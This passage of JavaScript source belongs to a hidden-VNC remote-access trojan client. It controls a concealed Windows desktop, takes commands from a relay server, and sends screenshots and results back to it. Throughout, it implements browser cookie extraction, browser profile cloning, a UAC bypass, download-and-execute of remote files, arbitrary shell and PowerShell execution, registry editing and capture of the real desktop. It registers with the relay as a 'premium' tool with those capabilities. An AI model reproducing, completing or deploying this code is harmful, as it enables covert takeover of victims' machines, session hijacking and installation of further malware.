    var hqPath = path.join(_captureDir, 'frame_hq.jpg');
    var escapedPath = hqPath.replace(/\\/g, '\\\\');
    var result = await sendPSCommand("$r = [HVNCHelper]::CaptureDesktopHQ('" + escapedPath + "'); Write-Output $r");
    if (result && result.indexOf('OK:') === 0) {
      var buf = fs.readFileSync(hqPath);
      if (buf.length > 100) return buf;
    }
  } catch(e) {
    console.error('[HVNC] HQ capture error:', e.message);
  }
  return null;
}

// Send mouse input to hidden desktop
async function sendMouseInput(x, y, action) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::SendMouseInput(' + x + ', ' + y + ', "' + action + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Send keyboard input to hidden desktop
async function sendKeyInput(vk, keyUp) {
  if (!_hvncDesktopCreated) return false;
  var keyUpStr = keyUp ? '$true' : '$false';
  var result = await sendPSCommand('$r = [HVNCHelper]::SendKeyInput(' + vk + ', ' + keyUpStr + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Type text on hidden desktop
async function typeText(text) {
  if (!_hvncDesktopCreated) return false;
  var safeText = String(text).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::TypeText("' + safeText + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Clipboard functions
async function getClipboard() {
  if (!_hvncDesktopCreated) return null;
  var result = await sendPSCommand('$r = [HVNCHelper]::GetClipboardText(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) return result.substring(3);
  if (result === 'EMPTY') return '';
  return null;
}

async function setClipboard(text) {
  if (!_hvncDesktopCreated) return false;
  var safeText = String(text).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::SetClipboardText("' + safeText + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Window management
async function listWindows() {
  if (!_hvncDesktopCreated) return [];
  var result = await sendPSCommand('$r = [HVNCHelper]::ListWindows(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    var data = result.substring(3);
    if (!data) return [];
    return data.split('^^').map(function(w) {
      var parts = w.split('|');
      return { hwnd: parts[0], title: parts[1] || '', size: parts[2] || '' };
    });
  }
  return [];
}

async function focusWindow(hwnd) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::FocusWindow(' + hwnd + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function closeWindowByHandle(hwnd) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::CloseWindowByHandle(' + hwnd + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Process management
async function listProcesses() {
  if (!_hvncDesktopCreated) return [];
  var result = await sendPSCommand('$r = [HVNCHelper]::ListProcesses(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    var data = result.substring(3);
    if (!data) return [];
    return data.split('^^').map(function(p) {
      var parts = p.split('|');
      return { pid: parts[0], name: parts[1] || '', title: parts[2] || '' };
    });
  }
  return [];
}

async function killProcess(pid) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::KillProcess(' + pid + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Resolution
async function setResolution(w, h) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::SetResolution(' + w + ', ' + h + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// Close hidden desktop
async function closeHiddenDesktop() {
  if (!_hvncDesktopCreated) return;

  // Kill launched processes
  for (var i = 0; i < _hvncProcesses.length; i++) {
    try { childProcess.execSync('taskkill /PID ' + _hvncProcesses[i] + ' /F /T', { windowsHide: true, stdio: 'ignore' }); } catch(e) {}
  }
  _hvncProcesses = [];

  if (_captureLoopStarted) {
    await sendPSCommand('$r = [HVNCHelper]::StopCaptureLoop(); Write-Output $r');
    _captureLoopStarted = false;
  }
  await sendPSCommand('$r = [HVNCHelper]::CloseDesktop(); Write-Output $r');
  killPersistentPS();
  _hvncDesktopCreated = false;
  _hvncActive = false;
  _keyloggerIndex = 0;
  _socksServer = null;
  _lastSignal = '';
  _captureLogCount = 0;
  // Cleanup persistent relay socket
  if (_relaySocket) { try { _relaySocket.destroy(); } catch(e) {} _relaySocket = null; }
}


// ═══════════════════════════════════════════════════════════════
// FEATURE 3: WINDOW MANIPULATION
// ═══════════════════════════════════════════════════════════════
async function minimizeWindow(hwnd) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::MinimizeWindow(' + hwnd + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function maximizeWindow(hwnd) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::MaximizeWindow(' + hwnd + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function restoreWindow(hwnd) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::RestoreWindow(' + hwnd + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function resizeWindow(hwnd, x, y, w, h) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::ResizeWindow(' + hwnd + ', ' + x + ', ' + y + ', ' + w + ', ' + h + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function setAlwaysOnTop(hwnd, onTop) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::SetAlwaysOnTop(' + hwnd + ', ' + (onTop ? '$true' : '$false') + '); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// ═══════════════════════════════════════════════════════════════
// FEATURE 4: SHELL/CMD EXECUTION
// ═══════════════════════════════════════════════════════════════
async function executeCommand(command, timeoutMs) {
  if (!_hvncDesktopCreated) return null;
  var safeCmd = String(command).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::ExecuteCommand("' + safeCmd + '", ' + (timeoutMs || 30000) + '); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    var parts = result.substring(3).split(':');
    var exitCode = parseInt(parts[0]);
    var outputB64 = parts.slice(1).join(':');
    var output = Buffer.from(outputB64, 'base64').toString('utf8');
    return { exitCode: exitCode, output: output };
  }
  return null;
}

async function executePowerShell(script, timeoutMs) {
  if (!_hvncDesktopCreated) return null;
  var safeScript = String(script).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::ExecutePowerShell("' + safeScript + '", ' + (timeoutMs || 30000) + '); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    var parts = result.substring(3).split(':');
    var exitCode = parseInt(parts[0]);
    var outputB64 = parts.slice(1).join(':');
    var output = Buffer.from(outputB64, 'base64').toString('utf8');
    return { exitCode: exitCode, output: output };
  }
  return null;
}




// ═══════════════════════════════════════════════════════════════
// FEATURE 5: BROWSER COOKIE INJECTION
// ═══════════════════════════════════════════════════════════════
async function extractBrowserCookies(browserType) {
  if (!_hvncDesktopCreated) return null;
  var result = await sendPSCommand('$r = [HVNCHelper]::ExtractBrowserCookies("' + browserType + '"); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) return result.substring(3);
  return null;
}

async function cloneBrowserProfile(sourceBrowser) {
  if (!_hvncDesktopCreated) return null;
  var targetDir = path.join(os.tmpdir(), '317_hvnc_profile_' + sourceBrowser);
  var escapedTarget = targetDir.replace(/\\/g, '\\\\');
  var result = await sendPSCommand('$r = [HVNCHelper]::CloneBrowserProfile("' + sourceBrowser + '", "' + escapedTarget + '"); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) return { path: targetDir, result: result.substring(3) };
  return null;
}

async function launchBrowserWithProfile(browserPath, sourceBrowser) {
  if (!_hvncDesktopCreated) return false;
  var profileDir = path.join(os.tmpdir(), '317_hvnc_profile_' + sourceBrowser);
  var args = '--user-data-dir="' + profileDir.replace(/\\/g, '\\\\') + '" --no-first-run --no-default-browser-check --disable-session-crashed-bubble --hide-crash-restore-bubble';
  return await launchOnDesktop(browserPath, args);
}

// ═══════════════════════════════════════════════════════════════
// FEATURE 13: UAC BYPASS
// ═══════════════════════════════════════════════════════════════
async function uacBypass(command) {
  if (!_hvncDesktopCreated) return false;
  var safeCmd = String(command).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::UACBypass("' + safeCmd + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

// ═══════════════════════════════════════════════════════════════
// DOWNLOAD AND EXECUTE
// ═══════════════════════════════════════════════════════════════
async function downloadAndExecute(url, filename) {
  if (!_hvncDesktopCreated) return false;
  var safeUrl = String(url).replace(/"/g, '`"');
  var safeName = String(filename).replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::DownloadAndExecute("' + safeUrl + '", "' + safeName + '"); Write-Output $r');
  console.log('[HVNC] DownloadAndExecute result:', result);
  return result && result.indexOf('OK') === 0;
}

// ═══════════════════════════════════════════════════════════════
// FEATURE 12: POWER MANAGEMENT (auto-reconnect built into session loop)
// ═══════════════════════════════════════════════════════════════
var _autoReconnect = true;
var _reconnectAttempts = 0;
var _maxReconnectAttempts = 10;
var _reconnectDelay = 5000;

function setAutoReconnect(enabled, maxAttempts, delay) {
  _autoReconnect = enabled !== false;
  _maxReconnectAttempts = maxAttempts || 10;
  _reconnectDelay = delay || 5000;
}


// ═══════════════════════════════════════════════════════════════
// SYSTEM MANAGEMENT WRAPPERS
// ═══════════════════════════════════════════════════════════════
async function getSystemInfo() {
  if (!_hvncDesktopCreated) return null;
  var result = await sendPSCommand('$r = [HVNCHelper]::GetSystemInfo(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    var info = {};
    result.substring(3).split('^^').forEach(function(item) {
      var eq = item.indexOf('=');
      if (eq > 0) info[item.substring(0, eq)] = item.substring(eq + 1);
    });
    return info;
  }
  return null;
}

async function isAdmin() {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::IsAdmin(); Write-Output $r');
  return result === 'OK:True';
}

async function getDriveInfo() {
  if (!_hvncDesktopCreated) return [];
  var result = await sendPSCommand('$r = [HVNCHelper]::GetDriveInfo(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    return result.substring(3).split('^^').map(function(d) {
      var p = d.split('|');
      return { name: p[0], type: p[1], totalMB: parseInt(p[2]), freeMB: parseInt(p[3]), format: p[4] };
    });
  }
  return [];
}

async function getNetworkInfo() {
  if (!_hvncDesktopCreated) return [];
  var result = await sendPSCommand('$r = [HVNCHelper]::GetNetworkInfo(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    return result.substring(3).split('^^').map(function(n) {
      var p = n.split('|');
      return { name: p[0], ip: p[1], type: p[2], speed: p[3] };
    });
  }
  return [];
}

async function getInstalledPrograms() {
  if (!_hvncDesktopCreated) return [];
  var result = await sendPSCommand('$r = [HVNCHelper]::GetInstalledPrograms(); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    return result.substring(3).split('^^').map(function(p) {
      var parts = p.split('|');
      return { name: parts[0], version: parts[1], publisher: parts[2] };
    });
  }
  return [];
}


async function captureRealDesktop() {
  if (!_hvncDesktopCreated) return null;
  var framePath = path.join(os.tmpdir(), '317_real_desktop.jpg');
  var escapedPath = framePath.replace(/\\/g, '\\\\');
  var result = await sendPSCommand('$r = [HVNCHelper]::CaptureRealDesktop("' + escapedPath + '"); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) {
    try {
      var buf = fs.readFileSync(framePath);
      try { fs.unlinkSync(framePath); } catch(e) {}
      return buf;
    } catch(e) {}
  }
  return null;
}

async function powerAction(action) {
  if (!_hvncDesktopCreated) return false;
  var result = await sendPSCommand('$r = [HVNCHelper]::PowerAction("' + action + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}


async function openUrl(url) {
  if (!_hvncDesktopCreated) return false;
  var safeUrl = String(url).replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::OpenUrl("' + safeUrl + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function setRegistryValue(root, keyPath, valueName, data) {
  if (!_hvncDesktopCreated) return false;
  var safeKey = String(keyPath).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var safeName = String(valueName).replace(/"/g, '`"');
  var safeData = String(data).replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::SetRegistryValue("' + root + '", "' + safeKey + '", "' + safeName + '", "' + safeData + '"); Write-Output $r');
  return result && result.indexOf('OK') === 0;
}

async function getRegistryValue(root, keyPath, valueName) {
  if (!_hvncDesktopCreated) return null;
  var safeKey = String(keyPath).replace(/\\/g, '\\\\').replace(/"/g, '`"');
  var safeName = String(valueName).replace(/"/g, '`"');
  var result = await sendPSCommand('$r = [HVNCHelper]::GetRegistryValue("' + root + '", "' + safeKey + '", "' + safeName + '"); Write-Output $r');
  if (result && result.indexOf('OK:') === 0) return result.substring(3);
  return null;
}

// Relay request (same pattern as stream.js)
var _relaySocket = null;
var _relayConnecting = false;
var _relayQueue = [];

function ensureRelaySocket() {
  return new Promise(function(resolve) {
    if (_relaySocket && !_relaySocket.destroyed) { resolve(_relaySocket); return; }
    if (_relayConnecting) { 
      var check = setInterval(function() { 
        if (_relaySocket && !_relaySocket.destroyed) { clearInterval(check); resolve(_relaySocket); }
        else if (!_relayConnecting) { clearInterval(check); resolve(null); }
      }, 10);
      return;
    }
    _relayConnecting = true;
    var sock = new net.Socket();
    sock.setNoDelay(true);
    sock.setTimeout(15000);
    sock.connect(RELAY_PORT, RELAY_HOST, function() {
      _relaySocket = sock;
      _relayConnecting = false;
      resolve(sock);
    });
    sock.on('error', function() { _relaySocket = null; _relayConnecting = false; resolve(null); });
    sock.on('timeout', function() { sock.destroy(); _relaySocket = null; _relayConnecting = false; });
    sock.on('close', function() { _relaySocket = null; _relayConnecting = false; });
  });
}

function hvncRelayRequest(reqPath, method, data) {
  return new Promise(async function(resolve) {
    var sock = await ensureRelaySocket();
    if (!sock || sock.destroyed) {
      // Fallback: one-shot socket
      var fallbackSock = new net.Socket();
      var isBuffer = Buffer.isBuffer(data);
      var postData = isBuffer ? data : (data ? JSON.stringify(data) : '');
      var contentType = isBuffer ? 'image/jpeg' : 'application/json';
      var httpLine = method + ' ' + reqPath + ' HTTP/1.1\r\nHost: ' + RELAY_HOST + ':' + RELAY_PORT + '\r\nContent-Type: ' + contentType + '\r\nContent-Length: ' + Buffer.byteLength(postData) + '\r\nConnection: close\r\n\r\n';
      var responseData = '';
      var done = false;
      fallbackSock.setTimeout(8000);
      fallbackSock.connect(RELAY_PORT, RELAY_HOST, function() { fallbackSock.write(Buffer.from(httpLine)); fallbackSock.write(isBuffer ? postData : Buffer.from(postData)); });
      fallbackSock.on('data', function(c) { responseData += c.toString(); });
      fallbackSock.on('end', function() {
        if (done) return; done = true;
        var bs = responseData.indexOf('\r\n\r\n');
        if (bs >= 0) {
          var body = responseData.substring(bs + 4);
          if (responseData.indexOf('chunked') >= 0) {
            var decoded = '';
            var lines = body.split('\r\n');
            for (var li = 0; li < lines.length; li++) {
              if (lines[li].length > 0 && !/^[0-9a-fA-F]+$/.test(lines[li])) decoded += lines[li];
            }
            body = decoded;
          }
          try { resolve(JSON.parse(body)); } catch(e) { resolve(null); }
        } else resolve(null);
      });
      fallbackSock.on('error', function() { if (!done) { done = true; resolve(null); } });
      fallbackSock.on('timeout', function() { if (!done) { done = true; fallbackSock.destroy(); resolve(null); } });
      fallbackSock.on('close', function() { if (!done) { done = true; resolve(null); } });
      return;
    }

    var isBuffer = Buffer.isBuffer(data);
    var postData = isBuffer ? data : (data ? JSON.stringify(data) : '');
    var contentLen = Buffer.byteLength(postData);
    var contentType = isBuffer ? 'image/jpeg' : 'application/json';

    var httpLine = method + ' ' + reqPath + ' HTTP/1.1\r\n';
    httpLine += 'Host: ' + RELAY_HOST + ':' + RELAY_PORT + '\r\n';
    httpLine += 'Content-Type: ' + contentType + '\r\n';
    httpLine += 'Content-Length: ' + contentLen + '\r\n';
    httpLine += 'Connection: keep-alive\r\n';
    httpLine += '\r\n';

    var responseData = '';
    var done = false;
    var contentLength = -1;
    var headerEnd = -1;

    var isChunked = false;

    function onData(chunk) {
      responseData += chunk.toString();
      if (headerEnd < 0) {
        headerEnd = responseData.indexOf('\r\n\r\n');
        if (headerEnd >= 0) {
          var headers = responseData.substring(0, headerEnd).toLowerCase();
          var clMatch = headers.match(/content-length:\s*(\d+)/);
          if (clMatch) contentLength = parseInt(clMatch[1]);
          isChunked = headers.indexOf('transfer-encoding: chunked') >= 0;
        }
      }
      if (headerEnd >= 0) {
        if (contentLength >= 0) {
          var bodyReceived = responseData.length - (headerEnd + 4);
          if (bodyReceived >= contentLength) finish();
        } else if (isChunked) {
          var body = responseData.substring(headerEnd + 4);
          if (body.indexOf('\r\n0\r\n') >= 0) finish();
        }
      }
    }

    function finish() {
      if (done) return;
      done = true;
      sock.removeListener('data', onData);
      sock.removeListener('error', onError);
      var bs = responseData.indexOf('\r\n\r\n');
      if (bs < 0) { resolve(null); return; }
      var body = responseData.substring(bs + 4);
      if (contentLength >= 0) body = body.substring(0, contentLength);
      if (isChunked) {
        var decoded = '';
        var lines = body.split('\r\n');
        for (var li = 0; li < lines.length; li++) {
          if (lines[li].length > 0 && !/^[0-9a-fA-F]+$/.test(lines[li])) decoded += lines[li];
        }
        body = decoded;
      }
      try { resolve(JSON.parse(body)); } catch(e) { resolve(null); }
    }

    function onError() {
      if (!done) { done = true; sock.removeListener('data', onData); _relaySocket = null; resolve(null); }
    }

    sock.on('data', onData);
    sock.on('error', onError);

    // Timeout per request
    setTimeout(function() { if (!done) { done = true; sock.removeListener('data', onData); sock.removeListener('error', onError); resolve(null); } }, 5000);

    sock.write(Buffer.from(httpLine));
    sock.write(isBuffer ? postData : Buffer.from(postData));
  });
}

// Process HVNC commands from relay server
async function processHvncCommands(result) {
  if (!result || !result['hvncCommands'] || result['hvncCommands']['length'] === 0) return;
  console.log('[HVNC] Processing', result['hvncCommands']['length'], 'command(s)');
  for (var i = 0; i < result['hvncCommands']['length']; i++) {
    var cmd = result['hvncCommands'][i];
    try {
      if (cmd['type'] === 'launch') {
        console.log('[HVNC] CMD launch:', cmd['path'], 'args:', cmd['args'] || '(none)');
        // explorer.exe needs special handling — use LaunchShellOnDesktop to
        // prevent singleton merge with the real desktop's shell
        var isExplorer = String(cmd['path']).toLowerCase().indexOf('explorer.exe') !== -1;
        var pid;
        if (isExplorer) {
          pid = await sendPSCommand('$r = [HVNCHelper]::LaunchShellOnDesktop(); Write-Output $r');
        } else {
          pid = await launchOnDesktop(cmd['path'], cmd['args'] || '');
        }
        console.log('[HVNC] Launch result PID:', pid);
      } else if (cmd['type'] === 'mouse') {
        await sendMouseInput(cmd['x'], cmd['y'], cmd['action']);
      } else if (cmd['type'] === 'scroll') {
        await sendMouseInput(cmd['x'], cmd['y'], cmd['direction'] === 'up' ? 'scrollup' : 'scrolldown');
      } else if (cmd['type'] === 'key') {
        await sendKeyInput(cmd['vk'], cmd['keyUp']);
      } else if (cmd['type'] === 'type') {
        console.log('[HVNC] CMD type:', cmd['text']);
        await typeText(cmd['text']);
      } else if (cmd['type'] === 'close') {
        console.log('[HVNC] CMD close');
        await closeHiddenDesktop();
      } else if (cmd['type'] === 'getClipboard') {
        var clip = await getClipboard();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'clipboard', data: clip !== null ? clip : ''});
      } else if (cmd['type'] === 'setClipboard') {
        await setClipboard(cmd['text'] || '');
      } else if (cmd['type'] === 'listWindows') {
        var wins = await listWindows();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'windows', data: wins});
      } else if (cmd['type'] === 'focusWindow') {
        await focusWindow(cmd['hwnd']);
      } else if (cmd['type'] === 'closeWindow') {
        await closeWindowByHandle(cmd['hwnd']);
      } else if (cmd['type'] === 'listProcesses') {
        var procs = await listProcesses();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'processes', data: procs});
      } else if (cmd['type'] === 'killProcess') {
        await killProcess(cmd['pid']);
      } else if (cmd['type'] === 'setResolution') {
        await setResolution(cmd['width'], cmd['height']);
      } else if (cmd['type'] === 'captureHQ') {
        console.log('[HVNC] CMD captureHQ');
        var hqBuf = await captureHiddenDesktopHQ();
        if (hqBuf && _hvncAgentId) {
          await hvncRelayRequest('/api/hvnc/screenshot/' + _hvncAgentId + '?hq=1', 'POST', hqBuf);
          console.log('[HVNC] HQ screenshot sent (' + hqBuf.length + ' bytes)');
        }
      }
      // ═══ FEATURE 3: WINDOW MANIPULATION ═══
      else if (cmd['type'] === 'minimizeWindow') {
        await minimizeWindow(cmd['hwnd']);
      } else if (cmd['type'] === 'maximizeWindow') {
        await maximizeWindow(cmd['hwnd']);
      } else if (cmd['type'] === 'restoreWindow') {
        await restoreWindow(cmd['hwnd']);
      } else if (cmd['type'] === 'resizeWindow') {
        await resizeWindow(cmd['hwnd'], cmd['x'], cmd['y'], cmd['w'], cmd['h']);
      } else if (cmd['type'] === 'alwaysOnTop') {
        await setAlwaysOnTop(cmd['hwnd'], cmd['onTop']);
      }
      // ═══ FEATURE 4: SHELL EXECUTION ═══
      else if (cmd['type'] === 'execCmd') {
        var result = await executeCommand(cmd['command'], cmd['timeout']);
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'shellResult', data: result});
      } else if (cmd['type'] === 'execPS') {
        var result = await executePowerShell(cmd['script'], cmd['timeout']);
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'shellResult', data: result});
      }
      // ═══ FEATURE 12: POWER MANAGEMENT ═══
      else if (cmd['type'] === 'setReconnect') {
        setAutoReconnect(cmd['enabled'], cmd['maxAttempts'], cmd['delay']);
      }
      // ═══ SYSTEM MANAGEMENT ═══
      else if (cmd['type'] === 'getSystemInfo') {
        var info = await getSystemInfo();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'systemInfo', data: info});
      } else if (cmd['type'] === 'isAdmin') {
        var admin = await isAdmin();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'isAdmin', data: admin});
      } else if (cmd['type'] === 'getDrives') {
        var drives = await getDriveInfo();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'drives', data: drives});
      } else if (cmd['type'] === 'getNetwork') {
        var net = await getNetworkInfo();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'network', data: net});
      } else if (cmd['type'] === 'getPrograms') {
        var progs = await getInstalledPrograms();
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'programs', data: progs});
      } else if (cmd['type'] === 'captureReal') {
        var realBuf = await captureRealDesktop();
        if (realBuf && _hvncAgentId) await hvncRelayRequest('/api/hvnc/screenshot/' + _hvncAgentId + '?real=1', 'POST', realBuf);
      } else if (cmd['type'] === 'power') {
        await powerAction(cmd['action']);
      } else if (cmd['type'] === 'downloadExec') {
        var ok = await downloadAndExecute(cmd['url'], cmd['filename']);
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'downloadExec', success: ok});
      }
      // ═══ FEATURE 5: BROWSER COOKIE INJECTION ═══
      else if (cmd['type'] === 'extractCookies') {
        var cookies = await extractBrowserCookies(cmd['browser'] || 'chrome');
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'cookies', data: cookies});
      } else if (cmd['type'] === 'cloneProfile') {
        var profile = await cloneBrowserProfile(cmd['browser'] || 'chrome');
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'cloneProfile', data: profile});
      } else if (cmd['type'] === 'launchWithProfile') {
        var ok = await launchBrowserWithProfile(cmd['browserPath'], cmd['browser'] || 'chrome');
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'launchWithProfile', success: ok});
      }
      // ═══ FEATURE 13: UAC BYPASS ═══
      else if (cmd['type'] === 'uacBypass') {
        var ok = await uacBypass(cmd['command']);
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'uacBypass', success: ok});
      } else if (cmd['type'] === 'openUrl') {
        await openUrl(cmd['url']);
      } else if (cmd['type'] === 'setRegistry') {
        var ok = await setRegistryValue(cmd['root'], cmd['keyPath'], cmd['valueName'], cmd['data']);
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'setRegistry', success: ok});
      } else if (cmd['type'] === 'getRegistry') {
        var val = await getRegistryValue(cmd['root'], cmd['keyPath'], cmd['valueName']);
        if (_hvncAgentId) await hvncRelayRequest('/api/hvnc/queryresult/' + _hvncAgentId, 'POST', {type: 'getRegistry', data: val});
      }
      else {
        console.log('[HVNC] Unknown cmd type:', cmd['type']);
      }
    } catch(cmdErr) {
      console.error('[HVNC] Command error:', cmdErr.message);
    }
  }
}

// Main HVNC session loop
async function startHvncSession(agentId) {
  console.log('[HVNC] Starting HVNC session for agent:', agentId);

  // Create hidden desktop
  var created = await createHiddenDesktop();
  if (!created) {
    console.error('[HVNC] Desktop creation failed, aborting session');
    return null;
  }

  _hvncActive = true;
  _hvncAgentId = agentId;
  _reconnectAttempts = 0;

  // Register HVNC session with relay (with capabilities list)
  console.log('[HVNC] Registering with relay server...');
  var regData = {
    agentId: agentId,
    desktopName: HVNC_DESKTOP_NAME,
    capabilities: [
      'fileManager', 'windowManip', 'shell', 'autoReconnect',
      'cookieInjection', 'uacBypass', 'downloadExec',
      'systemInfo', 'driveInfo', 'networkInfo', 'installedPrograms',
      'realDesktopCapture', 'powerControl',
      'registryEdit', 'openUrl', 'explorerShell'
    ],
    version: '3.1.7-premium'
  };
  var regResult = await hvncRelayRequest('/api/hvnc/register', 'POST', regData);
  if (!regResult || !regResult['success']) {
    console.error('[HVNC] Registration failed (attempt 1), retrying...');
    await new Promise(function(r) { setTimeout(r, 3000); });
    regResult = await hvncRelayRequest('/api/hvnc/register', 'POST', regData);
    if (!regResult || !regResult['success']) {
      console.error('[HVNC] Registration failed (attempt 2), retrying with longer delay...');
      await new Promise(function(r) { setTimeout(r, 5000); });
      regResult = await hvncRelayRequest('/api/hvnc/register', 'POST', regData);
    }
  }
  if (!regResult || !regResult['success']) {
    console.error('[HVNC] Registration failed after 3 attempts, will keep trying in push loop');
  } else {
    console.log('[HVNC] Registered with relay, starting frame push loop');
  }

  // Reliable one-shot frame sender — proven pattern from stream.js
  // One TCP socket per frame, Connection: close, clean response
  var _screenshotPath = '/api/hvnc/screenshot/' + agentId;
  var _totalFrameCount = 0;
  var _totalErrors = 0;

  function sendFrame(frame) {
    return new Promise(function(resolve) {
      var sock = new net.Socket();
      sock.setNoDelay(true);
      sock.setTimeout(8000);
      var httpLine = 'POST ' + _screenshotPath + ' HTTP/1.1\r\nHost: ' + RELAY_HOST + ':' + RELAY_PORT + '\r\nContent-Type: image/jpeg\r\nContent-Length: ' + frame.length + '\r\nConnection: close\r\n\r\n';
      var responseData = '';
      var done = false;
      sock.connect(RELAY_PORT, RELAY_HOST, function() {
        sock.write(httpLine);
        sock.write(frame);
      });
      sock.on('data', function(c) { responseData += c.toString(); });
      sock.on('end', function() {
        if (done) return;
        done = true;
        var bs = responseData.indexOf('\r\n\r\n');
        if (bs >= 0) {
          var body = responseData.substring(bs + 4);
          // Handle chunked transfer encoding (same as stream.js relayRequest)
          if (responseData.indexOf('chunked') >= 0) {
            var decoded = '';
            var lines = body.split('\r\n');
            for (var li = 0; li < lines.length; li++) {
              var line = lines[li];
              if (line.length > 0 && !/^[0-9a-fA-F]+$/.test(line)) {
                decoded += line;
              }
            }
            body = decoded;
          }
          try { resolve(JSON.parse(body)); } catch(e) { resolve(null); }
        } else { resolve(null); }
      });
      sock.on('error', function() { if (!done) { done = true; resolve(null); } });
      sock.on('timeout', function() { if (!done) { done = true; sock.destroy(); resolve(null); } });
      sock.on('close', function() { if (!done) { done = true; resolve(null); } });
    });
  }

  // Single tight push loop — no unnecessary throttle delays
  (async function hvncPushLoop() {
    console.log('[HVNC] Starting frame push loop');
    while (_hvncActive) {
      try {
        var frame = await captureHiddenDesktop();
        if (frame && frame.length > 100) {
          var r = await sendFrame(frame);
          if (r) {
            _totalFrameCount++;
            _totalErrors = 0;
            if (_totalFrameCount <= 5 || _totalFrameCount % 500 === 0) console.log('[HVNC] Frame #' + _totalFrameCount + ' sent (' + frame.length + ' bytes)');
            if (r['hvncCommands'] && r['hvncCommands']['length'] > 0) {
              console.log('[HVNC] Received ' + r['hvncCommands']['length'] + ' command(s) from relay');
            }
            processHvncCommands(r);
          } else {
            _totalErrors++;
          }
        } else {
          // No new frame — wait for next C# capture cycle
          await new Promise(function(r) { setTimeout(r, 5); });
        }
      } catch(e) {
        _totalErrors++;
        await new Promise(function(r) { setTimeout(r, 200); });
      }

